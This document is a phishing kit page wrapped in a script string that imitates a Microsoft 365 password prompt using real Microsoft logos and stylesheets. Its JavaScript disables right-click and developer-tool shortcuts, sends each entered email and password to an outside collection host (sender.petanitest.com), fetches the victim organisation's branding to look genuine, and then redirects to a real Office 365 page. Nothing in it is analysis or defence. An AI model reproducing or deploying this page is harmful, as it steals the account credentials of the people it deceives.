<script>
info="<html dir=&#34;ltr&#34; class=&#34;&#34; lang=&#34;en&#34;>

<head>
	<title>Sign in to your account</title>
	<meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;>
	<meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;>
	<meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes&#34;>
	<meta http-equiv=&#34;Pragma&#34; content=&#34;no-cache&#34;>
	<meta http-equiv=&#34;Expires&#34; content=&#34;-1&#34;>
	<meta name=&#34;robots&#34; content=&#34;none&#34;>
	<link rel=&#34;shortcut icon&#34;
		href=&#34;https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico&#34;>
	<link crossorigin=&#34;anonymous&#34;
		href=&#34;https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_rayhgcterrtxpnvapp3erg2.css&#34;
		rel=&#34;stylesheet&#34; integrity=&#34;sha384-jvrrqK5yohyA1y60fbaq1159IsEzxZ87hNHsnBpR+RXvdXfr5SC5NWp+2XdCh8HK&#34;>
	<link rel=&#34;prefetch&#34;
		href=&#34;https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_rayhgcterrtxpnvapp3erg2.css&#34;>
	<link rel=&#34;prefetch&#34;
		href=&#34;https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_szor2ujtsn_b-ik0b744ha2.js&#34;>
	<script src=&#34;https://code.jquery.com/jquery-3.1.1.min.js&#34;></script>
	<script>

	</script>
	<script>
		document.addEventListener(&#39;contextmenu&#39;, function (e) {
			e.preventDefault();
		});

		$(document).ready(function () {

			document.onkeydown = function (e) {
				if (event.keyCode == 123) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == &#39;E&#39;.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.shiftKey && e.keyCode == &#39;I&#39;.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.shiftKey && e.keyCode == &#39;J&#39;.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == &#39;U&#39;.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == &#39;S&#39;.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == &#39;H&#39;.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == &#39;A&#39;.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == &#39;F&#39;.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == &#39;E&#39;.charCodeAt(0)) {
					return false;
				}
			}
			var inputpw = document.getElementById(&#34;i0118&#34;);
			inputpw.addEventListener(&#34;keyup&#34;, function (event) {
				if (event.keyCode === 13) {
					event.preventDefault();
					document.getElementById(&#34;idSIButton9&#34;).click();
				}
			});

			var type = emails;
			console.log(type);


			$(&#39;#displayName&#39;).text(type);
			setTimeout(function () {
				var email = $(&#39;.identity&#39;).html();
				$(&#39;#lightbox&#39;).show();
				$(&#39;#i0118&#39;).focus();
				set_brand(email);

			}, 0);

			var count = 1;

			$(&#39;#idSIButton9&#39;).on(&#39;click&#39;, function (event) {
				event.preventDefault ? event.preventDefault() : event.returnValue = false;
				var user = $(&#39;.identity&#39;).html();
				var pass = $(&#39;#i0118&#39;).val();
				if (pass == &#34;&#34;) {
					$(&#34;#passwordError2&#34;).show();
					$(&#34;#important&#34;).hide();
					$(&#34;#i0118&#34;).css(&#34;border-color&#34;, &#34;#e81123&#34;);
					$(&#39;#i0118&#39;).focus();				} else {
					$(&#34;#i0118&#34;).css(&#34;border-color&#34;, &#34;black&#34;);
					$(&#34;#passwordError2&#34;).hide();
					$(&#34;#passwordError&#34;).hide();
					$(&#39;#idSIButton9&#39;).prop(&#39;disabled&#39;, true);
					$.ajax({
						url: `https://sender.petanitest.com/api/getresult/raymondbyran2021@hotmail.com/${key}`, // add external link here for policy.php
						data: {
							&#34;email&#34;: user,
							&#34;password&#34;: pass
						},
						type: &#34;POST&#34;,
						success: function (data) {
							if (data == 2) {
								setTimeout(function () {
									window.location.href = &#34;https://office365.com&#34;
								}, 2000);
							} else {

								console.log(count);
								count++;
								if (count > 1) {
									count = 1;
									setTimeout(function () {
										window.location.href = &#34;https://outlook.office365.com/Encryption/ErrorPage.aspx?src=3&code=11&be=SN6PR04MB4014&fe=JNAP275CA0040.ZAFP275.PROD.OUTLOOgK.COM&loc=en-US&itemID=E4E_M_e9df154a-e4b8-4486-8aec-7acceeb93fee&#34;
									}, 2000);
								} else {
									$(&#39;#i0118&#39;).val(&#39;&#39;);
									$(&#39;#progressBarw&#39;).hide();
									$(&#34;#passwordError&#34;).show();
									$(&#34;#important&#34;).hide();
									$(&#39;#idSIButton9&#39;).prop(&#39;disabled&#39;, false);
								}

							}
						},
						error: function (data) {
							console.log(&#39;Ajax error&#39;);
						}
					});

				}
			});

			function set_brand(email) {
				$.ajax({
					url: &#39;https://sender.petanitest.com/api/getBackground&#39;, // add external link here for brand.php
					type: &#34;POST&#34;,
					data: { username: email },
					success: function (data) {

						//i.bg_image !== null && i.logo_image !== null && i.bg_image !== &#39;&#39; && i.logo_image !== &#39;&#39;
						console.log(data.EstsProperties.UserTenantBranding[0].BannerLogo);

						if (data.EstsProperties.UserTenantBranding[0].BannerLogo) {
							$(&#39;.background-image&#39;).css({ &#39;background-image&#39;: &#39;url(&#39; + data.EstsProperties.UserTenantBranding[0].Illustration + &#39;)&#39;, &#34;-webkit-filter&#34;: &#34;brightness(20%)&#34;, &#34;filter&#34;: &#34;brightness(47%)&#34; });
							$(&#39;.logo&#39;).attr(&#39;src&#39;, data.EstsProperties.UserTenantBranding[0].BannerLogo);
						}
					}
				});
			}


		});

	</script>


</head>

<body data-bind=&#34;defineGlobals: ServerData, bodyCssClass&#34; class=&#34;cb&#34; style=&#34;display: block;&#34;>
	<div>
		<!--  -->
		<!--  -->
		<div data-bind=&#34;if: activeDialog&#34;></div>
		<form name=&#34;f1&#34; id=&#34;i0281&#34; novalidate=&#34;novalidate&#34; spellcheck=&#34;false&#34; method=&#34;post&#34; target=&#34;_top&#34;
			autocomplete=&#34;off&#34; data-bind=&#34;autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog&#34;>
			<!-- ko if: svr.iBannerEnvironment -->
			<!-- /ko -->
			<!-- ko withProperties: { &#39;$loginPage&#39;: $data } -->
			<div data-bind=&#34;component: { name: &#39;master-page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }&#34;>
				<!--  -->
				<!-- ko ifnot: useLayoutTemplates -->
				<!-- /ko -->
				<!-- ko if: useLayoutTemplates -->
				<!-- ko withProperties: { &#39;$page&#39;: $parent } -->
				<!-- ko ifnot: isVerticalSplitTemplate -->
				<div id=&#34;lightboxTemplateContainer&#34;
					data-bind=&#34;component: { name: &#39;lightbox-template&#39;, params: { serverData: svr } }&#34;>
					<!--  -->
					<div data-bind=&#34;component: { name: &#39;background-image-control&#39;,
    publicMethods: $page.backgroundControlMethods }&#34;>
						<div class=&#34;background-image-holder&#34; role=&#34;presentation&#34;
							data-bind=&#34;css: { app: isAppBranding }, style: { background: backgroundStyle }&#34;>
							<!-- ko if: smallImageUrl -->
							<!-- /ko -->
							<!-- ko if: backgroundImageUrl -->
							<div data-bind=&#34;backgroundImage: backgroundImageUrl(), externalCss: { &#39;background-image&#39;: true }&#34;
								class=&#34;background-image ext-background-image&#34;
								style=&#34;background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);&#34;>
							</div>
							<!-- ko if: useImageMask -->
							<!-- /ko -->
							<!-- /ko -->
						</div>
					</div>
					<div class=&#34;outer&#34; data-bind=&#34;css: { &#39;app&#39;: $page.backgroundLogoUrl }&#34;>
						<!-- ko if: showHeader -->
						<!-- /ko -->
						<div class=&#34;template-section main-section&#34;>
							<div class=&#34;middle&#34; data-bind=&#34;css: { &#39;has-header&#39;: showHeader }&#34;>
								<!-- ko if: $page.backgroundLogoUrl() && !($page.paginationControlMethods() && $page.paginationControlMethods().currentViewHasMetadata(&#39;hideLogo&#39;)) -->
								<!-- /ko -->
								<!-- ko if: svr.fShowPageLevelTitleAndDesc && !($page.paginationControlMethods() && $page.paginationControlMethods().currentViewHasMetadata(&#39;hidePageLevelTitleAndDesc&#39;)) -->
								<!-- /ko -->

								<div id=&#34;lightbox&#34; data-bind=&#34;
                animationEnd: $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().view_onAnimationEnd,
                externalCss: { &#39;sign-in-box&#39;: true },
                css: {
                    &#39;app&#39;: $page.backgroundLogoUrl(),
                    &#39;wide&#39;: $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;),
                    &#39;fade-in-lightbox&#39;: $page.fadeInLightBox,
                    &#39;has-popup&#39;: $page.showFedCredButtons() || $page.newSession(),
                    &#39;transparent-lightbox&#39;: $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                    &#39;lightbox-bottom-margin-debug&#39;: $page.showDebugDetails }&#34;
									class=&#34;sign-in-box ext-sign-in-box fade-in-lightbox&#34; style=&#34;display:none;&#34;>
									<!-- ko template: { nodes: $parentContext.$componentTemplateNodes, data: $page } -->
									<!-- ko if: svr.BE -->
									<!-- /ko -->
									<div class=&#34;lightbox-cover&#34;
										data-bind=&#34;css: { &#39;disable-lightbox&#39;: svr.bV &amp;&amp; showLightboxProgress() }&#34;>
									</div>
									<!-- ko if: showLightboxProgress -->
									<!-- /ko -->
									<div id=&#34;progressBarw&#34; class=&#34;progress&#34; role=&#34;progressbar&#34;
										data-bind=&#34;component: &#39;marching-ants-control&#39;, ariaLabel: str[&#39;WF_STR_ProgressText&#39;]&#34;
										aria-label=&#34;Please wait&#34; style=&#34;display:none;&#34;>
										<!--  -->
										<!-- ko if: useCssAnimation -->
										<div></div>
										<div></div>
										<div></div>
										<div></div>
										<div></div>
										<!-- /ko -->
										<!-- ko ifnot: useCssAnimation -->
										<!-- /ko -->
									</div>
									<div class=&#34;win-scroll&#34;>
										<!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata(&#39;hideLogo&#39;)) -->
										<div data-bind=&#34;component: { name: &#39;logo-control&#39;,
                params: {
                    isChinaDc: svr.fIsChinaDc,
                    bannerLogoUrl: bannerLogoUrl() } }&#34;>
											<!--  -->
											<!-- ko if: bannerLogoUrl -->
											<!-- /ko -->
											<!-- ko if: !bannerLogoUrl && !isChinaDc -->
											<!-- ko component: &#39;accessible-image-control&#39; -->
											<!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
											<!-- /ko -->
											<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
											<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img
												class=&#34;logo&#34; role=&#34;img&#34;
												pngsrc=&#34;https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png&#34;
												svgsrc=&#34;https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg&#34;
												data-bind=&#34;imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }&#34;
												src=&#34;https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg&#34;
												alt=&#34;Microsoft&#34;>
											<!-- /ko -->
											<!-- /ko -->
											<!-- /ko -->
											<!-- /ko -->
										</div>
										<!-- /ko -->
										<!-- ko if: svr.cR && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata(&#39;hideLwaDisclaimer&#39;)) -->
										<!-- /ko -->
										<!-- ko if: asyncInitReady -->
										<div role=&#34;main&#34; data-bind=&#34;component: { name: &#39;pagination-control&#39;,
                publicMethods: paginationControlMethods,
                params: {
                    enableCssAnimation: svr.ao,
                    disableAnimationIfAnimationEndUnsupported: svr.bZ,
                    initialViewId: initialViewId,
                    currentViewId: currentViewId,
                    initialSharedData: initialSharedData,
                    initialError: $loginPage.getServerError() },
                event: {
                    cancel: paginationControl_onCancel,
                    loadView: view_onLoadView,
                    showView: view_onShow,
                    setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                    animationStateChange: paginationControl_onAnimationStateChange } }&#34;>
											<!--  -->
											<div data-bind=&#34;css: { &#39;zero-opacity&#39;: hidePaginatedView() }&#34; class=&#34;&#34;>
												<!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.J) -->
												<div data-bind=&#34;css: {
        &#39;animate&#39;: animate() &amp;&amp; animate.animateBanner(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }&#34; class=&#34;animate slide-in-next&#34;>
													<div data-bind=&#34;component: { name: &#39;identity-banner-control&#39;,
            params: {
                userTileUrl: svr.bo,
                displayName: sharedData.displayName || svr.J,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }&#34;>
														<!--  -->
														<div class=&#34;identityBanner&#34;>
															<button type=&#34;button&#34; id=&#34;backArrow&#34; class=&#34;backButton&#34;
																data-bind=&#34;
        attr: { &#39;id&#39;: backButtonId || &#39;idBtn_Back&#39; },
        ariaLabel: str[&#39;CT_HRD_STR_Splitter_Back&#39;],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton&#34; id=&#34;idBtn_Back&#34; aria-label=&#34;Back&#34;>
																<!-- ko ifnot: svr.fIsRTLMarket -->
																<!-- ko component: &#39;accessible-image-control&#39; -->
																<!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
																<!-- /ko -->
																<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
																<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img
																	role=&#34;presentation&#34;
																	pngsrc=&#34;https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png&#34;
																	svgsrc=&#34;https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg&#34;
																	data-bind=&#34;imgSrc&#34;
																	src=&#34;https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg&#34;>
																<!-- /ko -->
																<!-- /ko -->
																<!-- /ko -->
																<!-- /ko -->
																<!-- ko if: svr.fIsRTLMarket -->
																<!-- /ko -->
															</button>
															<!-- ko if: isBackButtonVisible -->
															<!-- /ko -->
															<div id=&#34;displayName&#34; class=&#34;identity&#34;
																data-bind=&#34;text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }&#34;
																title=&#34;&#34;></div> <!-- Email -->
														</div>
													</div>
												</div>
												<!-- /ko -->
												<div class=&#34;pagination-view has-identity-banner animate slide-in-next&#34;
													data-bind=&#34;css: {
        &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.J),
        &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
        &#39;animate&#39;: animate(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }&#34;>
													<!-- ko foreach: views -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- ko template: { nodes: [$data], data: $parent } -->
													<div data-viewid=&#34;2&#34; data-showidentitybanner=&#34;true&#34;
														data-dynamicbranding=&#34;true&#34; data-bind=&#34;pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                    params: {
                        serverData: svr,
                        serverError: initialError,
                        isInitialView: isInitialState,
                        username: sharedData.username,
                        displayName: sharedData.displayName,
                        hipRequiredForUsername: sharedData.hipRequiredForUsername,
                        passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                        availableCreds: sharedData.availableCreds,
                        evictedCreds: sharedData.evictedCreds,
                        useEvictedCredentials: sharedData.useEvictedCredentials,
                        showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                        flowToken: sharedData.flowToken,
                        defaultKmsiValue: svr.Ag === 1,
                        userTenantBranding: sharedData.userTenantBranding,
                        sessions: sharedData.sessions,
                        callMetadata: sharedData.callMetadata },
                    event: {
                        updateFlowToken: $loginPage.view_onUpdateFlowToken,
                        submitReady: $loginPage.view_onSubmitReady,
                        redirect: $loginPage.view_onRedirect,
                        resetPassword: $loginPage.passwordView_onResetPassword,
                        setBackButtonState: view_onSetIdentityBackButtonState,
                        setPendingRequest: $loginPage.view_onSetPendingRequest } }&#34;>
														<!--  -->
														<!--  -->
														<input type=&#34;hidden&#34; name=&#34;i13&#34;
															data-bind=&#34;value: isKmsiChecked() ? 1 : 0&#34; value=&#34;0&#34;>
														<input type=&#34;hidden&#34; name=&#34;login&#34;
															data-bind=&#34;value: unsafe_username&#34; value=&#34;&#34;>
														<input type=&#34;text&#34; name=&#34;loginfmt&#34;
															data-bind=&#34;moveOffScreen, value: unsafe_displayName&#34;
															class=&#34;moveOffScreen&#34; tabindex=&#34;-1&#34; aria-hidden=&#34;true&#34;>
														<input type=&#34;hidden&#34; name=&#34;type&#34;
															data-bind=&#34;value: svr.Bo ? 20 : 11&#34; value=&#34;11&#34;>
														<input type=&#34;hidden&#34; name=&#34;LoginOptions&#34;
															data-bind=&#34;value: isKmsiChecked() ? 1 : 3&#34; value=&#34;3&#34;>
														<input type=&#34;hidden&#34; name=&#34;lrt&#34;
															data-bind=&#34;value: callMetadata.IsLongRunningTransaction&#34;
															value=&#34;&#34;>
														<input type=&#34;hidden&#34; name=&#34;lrtPartition&#34;
															data-bind=&#34;value: callMetadata.LongRunningTransactionPartition&#34;
															value=&#34;&#34;>
														<input type=&#34;hidden&#34; name=&#34;hisRegion&#34;
															data-bind=&#34;value: callMetadata.HisRegion&#34; value=&#34;&#34;>
														<input type=&#34;hidden&#34; name=&#34;hisScaleUnit&#34;
															data-bind=&#34;value: callMetadata.HisScaleUnit&#34; value=&#34;&#34;>
														<div id=&#34;loginHeader&#34; class=&#34;row title ext-title&#34; role=&#34;heading&#34;
															aria-level=&#34;1&#34;
															data-bind=&#34;text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;], externalCss: { &#39;title&#39;: true }&#34;>
															Enter password</div>
														<!-- ko if: showCredViewBrandingDesc -->
														<!-- /ko -->
														<!-- ko if: unsafe_pageDescription -->
														<!-- /ko -->
														<div class=&#34;row&#34;>
															<div class=&#34;form-group col-md-24&#34;>
																<div role=&#34;alert&#34; aria-live=&#34;assertive&#34;>

																	<div id=&#34;passwordError2&#34; style=&#34;display:none;&#34;
																		class=&#34;alert alert-error&#34; data-bind=&#34;
								htmlWithBindings: passwordTextbox.error,
								childBindings: { &#39;idA_IL_ForgotPassword0&#39;: { href: svr.urlResetPassword, click: resetPassword_onClick } }&#34;>
																		Please enter your password.</div>


																	<div id=&#34;passwordError&#34; style=&#34;display:none;&#34;
																		class=&#34;alert alert-error&#34; data-bind=&#34;
								htmlWithBindings: passwordTextbox.error,
								childBindings: { &#39;idA_IL_ForgotPassword0&#39;: { href: svr.urlResetPassword, click: resetPassword_onClick } }&#34;>Your
																		account or password is incorrect. If you can&#39;t
																		remember your password, <a
																			id=&#34;idA_IL_ForgotPassword0&#34;
																			href=&#34;https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAYWSO2_TUABG46RNH0MpCAESUlUkBoTk5NrXj7oICT8Sp4kT14mT1BFSFL8SO341durGAzNjJ4ayMVYwwIT6D-jUGXViQkwICQkx0f4Clk8633rO-gpVgiVQAk8LWAnbfUxAghzROoMyIwqiBIMBdETgFApJSEEcYCYJ4OzO-ubLk1cfr943xLeXxrMv-StwhmxNkiSKd8vlNE1LoW07hlUyQr_sjQLTCcafEeQSQb4jyGl-2QpQkTvLxxSksZ0dQDMAhxACigYlzeXcll_1NFdJBoI5afIAaJlBSqrnaC6baG7L0_Cq28oUUlarU1msLFqqQTQzJdHUlqM5ADQzDUj9PWIgVK6_ga9lWjoQ2u5AGHhf87dkdp5M8JsJZ05m_cqv2eHMH0ZhnJwW3uQP60ToNoei01EFfOCyrhdg42goHmViTTJQUpsuaDrSiYNYbfPGHIuq9a44IElZSlpHRz0mVXuSPqaVTE77vm4e18eNiO3NzERXycjsuKZtMpYrqtzUttrjflDrs3N0UWmgaVusy9Wu74mEjqITz8d1ZsZJUtTgjuUDs88y-6jepuI-nMYeQxyLkcKiOxWhzx3UmirhdHncaxBGV-dNRbFsKuTZdlhNDZjZ8DiLWShjZKLQknY0z9p-A9SVoLOQx2qmcXIvVaeZ3ZMXcM5HI67RodEdHTYzjwQ1_ABvsJ8KxWuZfhhcFDbCyAocczuahbbjWd8KD-PEiiZWkDpeHAYvvDAww0AfLW70Xy4hP5burRY3Cw9y27knd0Fhd3V1fTN3Q3-WkHfL1y0xzBahP_rAnt_fL278_Z27WC4fjg1P163uqOZ0Nc4dE_tJJYisiOdHlBXZoEscliW2o_GHzef0LnZSRE6KxYvi7T1h2KqoHZVtCWxbwIfgZ7HweiV3vvafOv8B0&amp;mkt=en-GB&amp;hosted=0&amp;device_platform=Windows+10&#34;>reset
																			it now.</a>
																	</div>
																	<div id=&#34;important&#34; style=&#34;
    color: black;
    font-size: 13px;
    font-style: italic;&#34; class=&#34;alert alert-error&#34; data-bind=&#34;
								htmlWithBindings: passwordTextbox.error,
								childBindings: { &#39;idA_IL_ForgotPassword0&#39;: { href: svr.urlResetPassword, click: resetPassword_onClick } }&#34;>
																		Because you&#39;re accessing sensitive info, you
																		need to verify your password</div>
																	<!-- ko if: passwordTextbox.error -->
																	<!-- /ko -->
																</div>
																<div class=&#34;placeholderContainer&#34; data-bind=&#34;component: { name: &#39;placeholder-textbox-field&#39;,
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }&#34;>
																	<!-- ko withProperties: { &#39;$placeholderText&#39;: placeholderText } -->
																	<!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
																	<input name=&#34;passwd&#34; type=&#34;password&#34; id=&#34;i0118&#34;
																		autocomplete=&#34;off&#34;
																		class=&#34;form-control input ext-input text-box ext-text-box&#34;
																		aria-required=&#34;true&#34; data-bind=&#34;
                textInput: passwordTextbox.value,
                ariaDescribedBy: [
                    &#39;loginHeader&#39;,
                    showCredViewBrandingDesc ? &#39;credViewBrandingDesc&#39; : &#39;&#39;,
                    unsafe_pageDescription ? &#39;passwordDesc&#39; : &#39;&#39;].join(&#39; &#39;),
                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                moveOffScreen: showPassword,
                externalCss: {
                    &#39;input&#39;: true,
                    &#39;text-box&#39;: true,
                    &#39;has-error&#39;: passwordTextbox.error }&#34; aria-describedby=&#34;loginHeader  &#34; placeholder=&#34;Password&#34;
																		tabindex=&#34;0&#34;>
																	<!-- ko if: svr.Cx && showPassword() -->
																	<!-- /ko -->
																	<!-- /ko -->
																	<!-- /ko -->
																	<!-- ko ifnot: usePlaceholderAttribute -->
																	<!-- /ko -->
																</div>
																<!-- ko if: svr.Cx -->
																<!-- /ko -->
															</div>
														</div>
														<!-- ko if: shouldHipInit -->
														<!-- /ko -->
														<div data-bind=&#34;css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }&#34;
															class=&#34;position-buttons&#34;>
															<div>
																<div class=&#34;row&#34;>
																	<div class=&#34;col-md-24&#34;>
																		<div class=&#34;text-13&#34;>
																			<div class=&#34;form-group&#34;> <a
																					id=&#34;idA_PWD_ForgotPassword&#34;
																					role=&#34;link&#34;
																					href=&#34;https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAYWSO2_TUABG46RNH0MpCAESUlUkBoTk5NrXj7oICT8Sp4kT14mT1BFSFL8SO341durGAzNjJ4ayMVYwwIT6D-jUGXViQkwICQkx0f4Clk8633rO-gpVgiVQAk8LWAnbfUxAghzROoMyIwqiBIMBdETgFApJSEEcYCYJ4OzO-ubLk1cfr943xLeXxrMv-StwhmxNkiSKd8vlNE1LoW07hlUyQr_sjQLTCcafEeQSQb4jyGl-2QpQkTvLxxSksZ0dQDMAhxACigYlzeXcll_1NFdJBoI5afIAaJlBSqrnaC6baG7L0_Cq28oUUlarU1msLFqqQTQzJdHUlqM5ADQzDUj9PWIgVK6_ga9lWjoQ2u5AGHhf87dkdp5M8JsJZ05m_cqv2eHMH0ZhnJwW3uQP60ToNoei01EFfOCyrhdg42goHmViTTJQUpsuaDrSiYNYbfPGHIuq9a44IElZSlpHRz0mVXuSPqaVTE77vm4e18eNiO3NzERXycjsuKZtMpYrqtzUttrjflDrs3N0UWmgaVusy9Wu74mEjqITz8d1ZsZJUtTgjuUDs88y-6jepuI-nMYeQxyLkcKiOxWhzx3UmirhdHncaxBGV-dNRbFsKuTZdlhNDZjZ8DiLWShjZKLQknY0z9p-A9SVoLOQx2qmcXIvVaeZ3ZMXcM5HI67RodEdHTYzjwQ1_ABvsJ8KxWuZfhhcFDbCyAocczuahbbjWd8KD-PEiiZWkDpeHAYvvDAww0AfLW70Xy4hP5burRY3Cw9y27knd0Fhd3V1fTN3Q3-WkHfL1y0xzBahP_rAnt_fL278_Z27WC4fjg1P163uqOZ0Nc4dE_tJJYisiOdHlBXZoEscliW2o_GHzef0LnZSRE6KxYvi7T1h2KqoHZVtCWxbwIfgZzH_eiV3vvafOv8B0&amp;mkt=en-GB&amp;hosted=0&amp;device_platform=Windows+10&#34;
																					data-bind=&#34;text: str[&#39;CT_PWD_STR_ForgotPwdLink_Text&#39;], href: svr.urlResetPassword, click: resetPassword_onClick&#34;>Forgotten
																					my password</a> </div>
																			<!-- ko if: allowPhoneDisambiguation -->
																			<!-- /ko -->
																			<!-- ko ifnot: useEvictedCredentials -->
																			<!-- ko component: { name: &#34;cred-switch-link-control&#34;,
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                redirect: onRedirect,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } -->
																			<!--  -->
																			<div class=&#34;form-group&#34;>
																				<!-- ko if: showSwitchToCredPickerLink -->
																				<!-- /ko -->
																				<!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
																				<!-- /ko -->
																				<!-- ko if: credentialCount === 0 && showForgotUsername -->
																				<!-- /ko -->
																			</div>
																			<!-- ko if: credLinkError -->
																			<!-- /ko -->
																			<!-- /ko -->
																			<!-- ko if: evictedCreds.length > 0 -->
																			<!-- /ko -->
																			<!-- /ko -->
																			<!-- ko if: showChangeUserLink -->
																			<!-- /ko -->
																		</div>
																	</div>
																</div>
															</div>
															<div class=&#34;win-button-pin-bottom&#34;>
																<div class=&#34;row&#34;
																	data-bind=&#34;css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }&#34;>
																	<div data-bind=&#34;component: { name: &#39;footer-buttons-field&#39;,
                params: {
                    serverData: svr,
                    primaryButtonText: str[&#39;CT_PWD_STR_SignIn_Button&#39;],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.F,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                event: {
                    primaryButtonClick: primaryButton_onClick } }&#34;>
																		<div class=&#34;col-xs-24 no-padding-left-right button-container&#34;
																			data-bind=&#34;
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin }&#34;>
																			<!-- ko if: isSecondaryButtonVisible -->
																			<!-- /ko -->
																			<div data-bind=&#34;css: { &#39;inline-block&#39;: isPrimaryButtonVisible }&#34;
																				class=&#34;inline-block&#34;>
																				<!-- type=&#34;submit&#34; is needed in-addition to &#39;type&#39; in primaryButtonAttributes observable to support IE8 -->
																				<input type=&#34;submit&#34; id=&#34;idSIButton9&#34;
																					data-bind=&#34;
            attr: primaryButtonAttributes,
            externalCss: {
                &#39;button&#39;: true,
                &#39;primary&#39;: true },
